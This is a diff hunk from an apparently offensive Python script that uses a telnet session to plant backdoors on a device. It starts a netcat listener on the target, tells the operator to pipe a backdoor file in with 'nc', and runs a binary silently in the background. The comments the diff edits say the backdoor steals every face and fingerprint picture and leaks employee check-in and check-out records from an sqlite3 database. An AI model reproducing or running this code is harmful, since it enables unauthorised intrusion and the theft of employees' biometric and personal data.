@@ -46,8 +46,8 @@ def TEL(h):
     print(" ----  Im Using Windows so : type hell | nc HOST P0RT !")
     print(" ----   Wait 10sec , Then press CTRL+C to stop file transfer...")
     s.write(bytes('nc -l -p 1337 >hell\r\n', 'utf-8'))  #### don't forget this , using : (type or cat) seconde_backdoor | nc TARGETIP 1337
-    # the seconde_backdoor is an automated script (that i w'll not share it lol ) used to steal every face picture, fingerprint picture
-    # and even leak every new checkin and checkout employe ( database file ) , or no wait i will just share a simple second_backdoor file :p.    
+    # the seconde_backdoor is an automated script (that i w'll not share lol ) used to steal every face picture, fingerprint picture
+    # and even leak every new checkin and checkout employe stored in sqlite3 database file , hmmmm wait i will just share a simple second_backdoor file :p.    
     print(s.read_until(b'#').decode())
 
     s.write(bytes('./9ys &>/dev/null &\r\n', 'utf-8'))
